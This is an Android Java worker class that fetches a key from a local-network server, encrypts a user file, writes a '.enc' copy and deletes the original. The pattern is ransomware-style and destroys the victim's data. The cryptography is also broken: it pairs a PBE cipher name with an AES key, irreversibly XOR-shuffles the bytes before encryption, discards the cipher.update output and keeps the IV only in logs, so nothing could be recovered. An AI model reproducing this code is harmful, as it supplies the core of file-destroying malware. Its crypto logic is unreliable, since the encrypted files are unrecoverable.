package com.example.myapplication.workers;

import android.content.Context;
import android.util.Log;

import com.android.volley.toolbox.Volley;

import org.json.JSONException;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URI;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.Random;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class EncryptBoi {
    private final String LOG_TAG = "NUMBAH 1:";
    private final String url = "http://192.168.43.134:3000/hash";
    private Context contexty;
    private MessageDigest md;
    private String boom;
    private  byte[] keyBytes,ivBytes;
    private  SecretKeySpec key;
    private  Cipher cipher;
    private  IvParameterSpec iv;
    private  FileInputStream fis;
    private  File encrypted,file;
    private  FileOutputStream fos;
    public EncryptBoi(Context context,File file1){
        contexty = context;
        file = file1;
    }
    public void weeeeeeeeeeeeee(){
        YeetRequest yeetRequest =  new YeetRequest(YeetRequest.Method.GET,url,null,response -> {
            try {
                Log.i(LOG_TAG, response.getString("session-ID"));
                boom = response.getString("key");
                md = MessageDigest.getInstance("SHA-256");
                keyBytes = md.digest(boom.getBytes());
                key = new SecretKeySpec(keyBytes, "AES");
                ivBytes = new byte[16];
                new SecureRandom().nextBytes(ivBytes);
                cipher = Cipher.getInstance("PBEWithHmacSHA256AndAES_256");
                iv = new IvParameterSpec(ivBytes);
                cipher.init(Cipher.ENCRYPT_MODE,key,iv);
                fis = new FileInputStream(file);
                encrypted = new File(file.getAbsolutePath().concat(".enc"));
                fos = new FileOutputStream(encrypted);
                int i;
                byte[] bytes = new byte[65536];
                do{
                    i = fis.read(bytes);
                    bytes = shuffleFun(bytes);
                    cipher.update(bytes);
                }while(i!=-1);
                fos.write(cipher.doFinal());
                fis.close();
                fos.close();
                file.delete();
                Log.i(LOG_TAG, Arrays.toString(ivBytes));
            } catch (JSONException | NoSuchAlgorithmException | InvalidAlgorithmParameterException | InvalidKeyException | NoSuchPaddingException | BadPaddingException | IllegalBlockSizeException | IOException e) {
                Log.e(LOG_TAG, "shit", e);
            }
        },Throwable::printStackTrace);
        yeetRequest.setCookies(new CookieBoi(contexty).get(URI.create(url)));
        Volley.newRequestQueue(contexty).add(yeetRequest);
    }

    private byte[] shuffleFun(byte[] original){
        Random random = new Random();
        for(int i = 0;i<original.length;i++){
            int x = random.nextInt(original.length);
            original = x%16 == 0 ? xorFun(original,i,x) : original;
            Log.i(LOG_TAG,String.format("%d,%d",i,x));
        }
        return original;
    }

    private byte[] xorFun(byte[] original,int x,int y){
        byte xored = (byte) (original[x] ^ original[y]);
        original[x] = xored;
        return original;
    }
}
